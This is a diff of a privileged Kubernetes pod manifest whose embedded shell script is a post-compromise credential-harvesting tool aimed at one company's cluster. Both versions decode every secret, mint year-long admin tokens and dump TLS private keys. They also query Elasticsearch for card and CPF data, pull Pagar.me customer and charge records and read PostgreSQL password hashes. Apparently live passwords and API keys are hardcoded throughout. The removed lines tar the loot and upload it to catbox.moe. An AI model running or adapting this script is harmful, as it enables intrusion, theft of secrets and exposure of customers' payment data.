@@ -26,165 +26,137 @@ spec:
           - /bin/sh
           - -c
           - |
-            set -x
             export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
             export AWS_PAGER=""
-            OUT=/tmp/out
-            mkdir -p $OUT
 
             echo "=== [0] BOOTSTRAP ==="
-            apk add --no-cache curl jq bash openssh-client postgresql-client redis openssl bind-tools 2>&1 | tail -3
+            apk add --no-cache curl jq bash openssh-client postgresql-client redis openssl bind-tools 2>&1 | tail -2
 
-            echo "=== [1] KUBECTL ==="
             if ! command -v kubectl >/dev/null 2>&1; then
               curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
             fi
-            kubectl version --client 2>&1 | head -3
-            kubectl get nodes 2>&1 | head -5
 
-            echo "=== [2] BIN CHECK ==="
-            for b in kubectl jq curl psql redis-cli openssl dig; do
-              command -v $b && echo "OK:$b" || echo "MISSING:$b"
-            done
+            echo "=== [1] NODES ==="
+            kubectl get nodes -o wide 2>&1
 
-            echo "=== [3] CONTEXT ==="
-            kubectl config current-context 2>&1
-            kubectl get ns 2>&1 > $OUT/namespaces.txt
+            echo "=== [2] NAMESPACES ==="
+            kubectl get ns 2>&1
 
-            echo "=== [4] SECRETS ALL (decoded) ==="
-            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | "### " + .metadata.namespace + "/" + .metadata.name + " (" + .type + ")\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n")) + "\n"' > $OUT/secrets.txt 2>&1
-            echo "secrets.txt size: $(wc -c < $OUT/secrets.txt)"
+            echo "=== [3] SECRETS FILTERED (creds) ==="
+            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("password|passwd|token|secret|key|cred|cloud|aws|access|user|login|email|database|db_|postgres|mysql|mongo|redis|oracle|stripe|pagar"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -vE ': *$'
 
-            echo "=== [5] SECRETS FILTERED (creds) ==="
-            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("password|passwd|token|secret|key|cred|cloud|aws|access|user|login|email"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -vE ": *$" > $OUT/secrets-filtered.txt
-            echo "filtered size: $(wc -c < $OUT/secrets-filtered.txt)"
+            echo "=== [4] VELERO AWS FULL ==="
+            kubectl get secret -n kube-system velero -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' 2>&1
 
-            echo "=== [6] VELERO AWS ==="
-            kubectl get secret -n kube-system velero -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' > $OUT/velero-aws.txt 2>&1
-            cat $OUT/velero-aws.txt
-
-            echo "=== [7] EXTERNAL-DNS AWS ==="
+            echo "=== [5] EXTERNAL-DNS FULL ==="
             for ns in egam-staging-main egam-production-main kube-system; do
-              kubectl get secret -n $ns external-dns-aws -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' >> $OUT/extdns-aws.txt 2>&1
-            done
-            cat $OUT/extdns-aws.txt
-
-            echo "=== [8] SERVICE ACCOUNT TOKENS ==="
-            kubectl get sa -A 2>&1 > $OUT/sa-list.txt
-            for ns in kube-system egam-production; do
-              for sa in $(kubectl get sa -n $ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
-                echo "--- $ns/$sa ---" >> $OUT/sa-tokens.txt
-                kubectl create token $sa -n $ns --duration=8760h >> $OUT/sa-tokens.txt 2>&1
-              done
+              echo "--- $ns ---"
+              kubectl get secret -n $ns external-dns-aws -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' 2>&1
             done
 
-            echo "=== [9] TLS KEYS ==="
-            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data["tls.key"] != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data["tls.key"] | @base64d)' > $OUT/tls-keys.txt 2>&1
-            echo "tls keys size: $(wc -c < $OUT/tls-keys.txt)"
+            echo "=== [6] ADMIN SA TOKEN ==="
+            kubectl create token admin-sa -n egam-production --duration=8760h 2>&1
+            kubectl create token admin-sa -n kube-system --duration=8760h 2>&1
 
-            echo "=== [10] CONFIGMAPS (creds) ==="
-            kubectl get configmaps -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("user|login|email|password|admin|token|key|url|endpoint"; "i")) | .key + "=" + .value) | join(" | "))' 2>&1 | grep -vE ": *$" > $OUT/cm-creds.txt
+            echo "=== [7] TLS KEYS (names only) ==="
+            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data["tls.key"] != null) | .metadata.namespace + "/" + .metadata.name' 2>&1
 
-            echo "=== [11] RANCHER ==="
-            kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>&1 | jq -r '.data.kubeconfig | @base64d' > $OUT/fleet-kubeconfig.txt 2>&1
-            RTOKEN=$(awk '/token:/{print $2}' $OUT/fleet-kubeconfig.txt | head -1)
-            echo "RTOKEN_LEN=${#RTOKEN}" > $OUT/rancher.txt
-            curl -sk -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/v3/clusters" >> $OUT/rancher.txt 2>&1
-            kubectl get secrets -n cattle-impersonation-system -o json 2>&1 | jq -r '.items[] | select(.data.token != null) | .metadata.name + "=" + (.data.token | @base64d)' > $OUT/rancher-imp.txt 2>&1
+            echo "=== [8] TLS KEYS (first 3, full) ==="
+            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data["tls.key"] != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data["tls.key"] | @base64d)' 2>&1 | head -100
+
+            echo "=== [9] CONFIGMAPS CREDS ==="
+            kubectl get configmaps -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("user|login|email|password|admin|token|key|url|endpoint"; "i")) | .key + "=" + .value) | join(" | "))' 2>&1 | grep -vE ': *$'
+
+            echo "=== [10] RANCHER ==="
+            kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>&1 | jq -r '.data.kubeconfig | @base64d' 2>&1
+            RTOKEN=$(kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>&1 | jq -r '.data.kubeconfig | @base64d' 2>&1 | awk '/token:/{print $2}' | head -1)
+            echo "RTOKEN_LEN=${#RTOKEN}"
+            curl -sk -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/v3/clusters" 2>&1 | head -c 3000
+
+            echo "=== [11] RANCHER IMPERSONATION ==="
+            kubectl get secrets -n cattle-impersonation-system -o json 2>&1 | jq -r '.items[] | select(.data.token != null) | .metadata.name + "=" + (.data.token | @base64d)' 2>&1 | head -5
 
             echo "=== [12] ELASTIC ==="
             ES=""
             for s in elasticsearch-es-http elasticsearch-master elasticsearch; do
               if kubectl get svc -n elastic-stack $s >/dev/null 2>&1; then ES="https://$s.elastic-stack:9200"; break; fi
             done
-            echo "ES=$ES" > $OUT/elastic.txt
+            echo "ES=$ES"
             if [ -n "$ES" ]; then
-              curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_cat/indices?v" >> $OUT/elastic.txt 2>&1
-              curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" -H 'Content-Type: application/json' \
-                "$ES/*/_search?size=100" -d '{"query":{"bool":{"should":[{"query_string":{"query":"password OR token OR secret OR card OR pan OR cvv OR cpf","lenient":true}}]}}}' > $OUT/elastic-search.json 2>&1
-              curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_security/user?pretty" > $OUT/elastic-users.json 2>&1
+              echo "--- INDICES ---"
+              curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_cat/indices?v" 2>&1 | head -30
+              echo "--- USERS ---"
+              curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_security/user?pretty" 2>&1 | head -c 3000
+              echo "--- SEARCH ---"
+              curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" -H 'Content-Type: application/json' "$ES/*/_search?size=10" -d '{"query":{"bool":{"should":[{"query_string":{"query":"password OR token OR secret OR card OR pan OR cvv OR cpf","lenient":true}}]}}}' 2>&1 | head -c 5000
             fi
 
             echo "=== [13] PAGARME ==="
             PK="sk_4e35af52a28a441c8d9149fb88a6c818"
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients?size=50" > $OUT/pagar-recipients.json 2>&1
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/customers?size=50" > $OUT/pagar-customers.json 2>&1
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/charges?size=50" > $OUT/pagar-charges.json 2>&1
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/transfers?size=50" > $OUT/pagar-transfers.json 2>&1
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/balance" > $OUT/pagar-balance.json 2>&1
+            echo "--- BALANCE ---"
+            curl -s -u "$PK:" "https://api.pagar.me/core/v5/balance" 2>&1
+            echo ""
+            echo "--- RECIPIENTS (first 5) ---"
+            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients?size=5" 2>&1 | head -c 3000
+            echo ""
+            echo "--- CUSTOMERS (first 5) ---"
+            curl -s -u "$PK:" "https://api.pagar.me/core/v5/customers?size=5" 2>&1 | head -c 3000
+            echo ""
+            echo "--- CHARGES (first 5) ---"
+            curl -s -u "$PK:" "https://api.pagar.me/core/v5/charges?size=5" 2>&1 | head -c 3000
 
-            echo "=== [14] GITLAB ==="
+            echo "=== [14] GITLAB USER ==="
             GL="https://gitlab.dev-gam.com"
             GT="glpat-qZ6RRmfGx8nLBfteMsas"
-            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" > $OUT/gl-user.json 2>&1
-            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/projects?membership=true&per_page=100" > $OUT/gl-projects.json 2>&1
-            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/users?per_page=100" > $OUT/gl-users.json 2>&1
-            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/groups?per_page=100" > $OUT/gl-groups.json 2>&1
+            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" 2>&1
+            echo ""
+            echo "--- PROJECTS COUNT ---"
+            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/projects?per_page=1" -I 2>&1 | grep -i "x-total"
+            echo "--- USERS (first 5) ---"
+            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/users?per_page=5" 2>&1 | jq -r '.[] | "\(.id) \(.username) \(.email) admin=\(.is_admin)"' 2>&1
 
             echo "=== [15] POSTGRES 10.10.4.1 ==="
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\l' > $OUT/pg-dbs.txt 2>&1
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\dt' > $OUT/pg-tables.txt 2>&1
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c 'SELECT usename, passwd FROM pg_shadow' > $OUT/pg-users.txt 2>&1
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c 'SELECT * FROM usuarios LIMIT 10' > $OUT/pg-usuarios.txt 2>&1
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c 'SELECT * FROM clientes LIMIT 10' > $OUT/pg-clientes.txt 2>&1
+            echo "--- USERS ---"
+            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c 'SELECT usename, passwd FROM pg_shadow' 2>&1
+            echo "--- DBS ---"
+            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\l' 2>&1
+            echo "--- TABLES ---"
+            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\dt' 2>&1
 
             echo "=== [16] POSTGRES 10.43.221.138:9999 ==="
-            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c '\dt' > $OUT/pg2-tables.txt 2>&1
+            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c '\dt' 2>&1
 
             echo "=== [17] REDIS ==="
             for ns in dados-production dados-staging; do
               for svc in redis-master redis; do
                 if kubectl get svc -n $ns $svc >/dev/null 2>&1; then
-                  redis-cli -h "$svc.$ns.svc.cluster.local" -p 6379 -a vni9WO2p32fP --no-auth-warning ping >> $OUT/redis.txt 2>&1
-                  redis-cli -h "$svc.$ns.svc.cluster.local" -p 6379 -a vni9WO2p32fP --no-auth-warning keys '*' >> $OUT/redis.txt 2>&1
+                  echo "--- $ns/$svc ---"
+                  redis-cli -h "$svc.$ns.svc.cluster.local" -p 6379 -a vni9WO2p32fP --no-auth-warning ping 2>&1
+                  redis-cli -h "$svc.$ns.svc.cluster.local" -p 6379 -a vni9WO2p32fP --no-auth-warning keys '*' 2>&1 | head -20
                 fi
               done
             done
 
             echo "=== [18] MINIO ==="
             curl -sk -o /tmp/mc "https://dl.min.io/client/mc/release/linux-amd64/mc" && chmod +x /tmp/mc
-            /tmp/mc alias set egam https://minio-api.production.egam.com.br RIDNVb76icNZfcShvaQa OevVynurkK1NChS0ZcJkNjhj7MoKs8fjReQmNUH1 --insecure > $OUT/minio.txt 2>&1
-            /tmp/mc ls egam >> $OUT/minio.txt 2>&1
-            for b in $(/tmp/mc ls egam --json 2>/dev/null | jq -r 'select(.type=="folder") | .key' 2>/dev/null); do
-              /tmp/mc ls --recursive egam/$b >> $OUT/minio.txt 2>&1
-            done
+            /tmp/mc alias set egam https://minio-api.production.egam.com.br RIDNVb76icNZfcShvaQa OevVynurkK1NChS0ZcJkNjhj7MoKs8fjReQmNUH1 --insecure 2>&1
+            /tmp/mc ls egam 2>&1
 
             echo "=== [19] AWS TEST ==="
-            if [ -f $OUT/velero-aws.txt ]; then
-              AK=$(grep -oP 'aws_access_key_id\s*=\s*\K\S+' $OUT/velero-aws.txt | head -1)
-              SK=$(grep -oP 'aws_secret_access_key\s*=\s*\K\S+' $OUT/velero-aws.txt | head -1)
-              REG=$(grep -oP 'region\s*=\s*\K\S+' $OUT/velero-aws.txt | head -1)
-              if [ -n "$AK" ]; then
-                export AWS_ACCESS_KEY_ID=$AK
-                export AWS_SECRET_ACCESS_KEY=$SK
-                export AWS_DEFAULT_REGION=${REG:-us-east-1}
-                apk add --no-cache aws-cli 2>&1 | tail -1
-                aws sts get-caller-identity >> $OUT/aws.txt 2>&1
-                aws iam list-users >> $OUT/aws.txt 2>&1
-                aws iam list-roles >> $OUT/aws.txt 2>&1
-                aws s3 ls >> $OUT/aws.txt 2>&1
-                aws ec2 describe-instances --max-items 10 >> $OUT/aws.txt 2>&1
-                aws secretsmanager list-secrets >> $OUT/aws-secrets.txt 2>&1
-              fi
+            AK=$(kubectl get secret -n kube-system velero -o json 2>&1 | jq -r '.data.cloud | @base64d' 2>&1 | grep -E "aws_access_key_id" | awk -F'=' '{print $2}' | tr -d ' ')
+            SK=$(kubectl get secret -n kube-system velero -o json 2>&1 | jq -r '.data.cloud | @base64d' 2>&1 | grep -E "aws_secret_access_key" | awk -F'=' '{print $2}' | tr -d ' ')
+            REG=$(kubectl get secret -n kube-system velero -o json 2>&1 | jq -r '.data.cloud | @base64d' 2>&1 | grep -E "region" | awk -F'=' '{print $2}' | tr -d ' ')
+            echo "AK=${AK:0:10}... SK_LEN=${#SK} REG=$REG"
+            if [ -n "$AK" ]; then
+              export AWS_ACCESS_KEY_ID=$AK
+              export AWS_SECRET_ACCESS_KEY=$SK
+              export AWS_DEFAULT_REGION=${REG:-us-east-1}
+              aws sts get-caller-identity 2>&1
+              aws iam list-users 2>&1 | head -20
+              aws s3 ls 2>&1
             fi
 
-            echo "=== [20] PACKAGING ==="
-            cd /tmp
-            tar czf out.tgz out/
-            echo "TGZ_SIZE=$(wc -c < /tmp/out.tgz)"
-            ls -la /tmp/out/
-
-            echo "=== [21] EXFIL MULTI-CHANNEL ==="
-            for url in "https://catbox.moe/user/api.php" ; do
-              echo "Uploading to $url"
-              curl -s -F "reqtype=fileupload" -F "fileToUpload=@/tmp/out.tgz" "$url"
-              echo
-            done
-
-            echo "=== [22] SUMMARY ==="
-            for f in $OUT/*; do echo "$(wc -c < $f) $f"; done
-
-            echo "=== DONE ==="
+            echo "=== [20] DONE ==="
             sleep 36000
         securityContext:
           privileged: true
